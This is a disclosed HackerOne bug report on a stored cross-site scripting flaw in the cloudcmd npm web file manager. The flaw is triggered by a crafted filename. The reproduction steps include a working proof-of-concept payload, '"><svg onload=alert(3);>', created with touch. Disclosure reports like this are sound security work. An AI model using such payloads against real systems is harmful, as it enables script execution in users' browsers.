---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '341044'
original_report_id: '341044'
title: '[cloudcmd] Stored XSS in the filename when directories listing'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: nodejs-ecosystem
created_at: '2018-04-20T09:12:33.738Z'
disclosed_at: '2018-04-25T17:46:22.250Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
asset_identifier: cloudcmd
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [cloudcmd] Stored XSS in the filename when directories listing

## Metadata

- HackerOne Report ID: 341044
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2018-04-25T17:46:22.250Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a Stored XSS issue in module **cloudcmd**
It allows executing malicious javascript code in the user's browser.

# Module

**module name**: cloudcmd
**version**: 9.1.5
**npm page**: https://www.npmjs.com/package/cloudcmd

## Module Description

> Cloud Commander is an orthodox web file manager with console and editor.

## Module Stats

4,433 downloads in the last week

{F288918}

# Vulnerability

## Steps To Reproduce:

* Install the module

```
$ npm i cloudcmd
```

* Run

```
$ ./node_modules/cloudcmd/bin/cloudcmd.js --root .
```

* In the target directory, create a file with name `"><svg onload=alert(3);>`

```
bash$ touch '"><svg onload=alert(3);>'
```

* In the browser, go to http://127.0.0.1:8080/, the XSS popup will fire.

{F288917}

## Supporting Material/References:

* macOS High Sierra 10.13.4
* node v8.10.0
* npm 5.6.0
* Chrome Version 65.0.3325.181 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows executing malicious javascript code in the user's browser

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
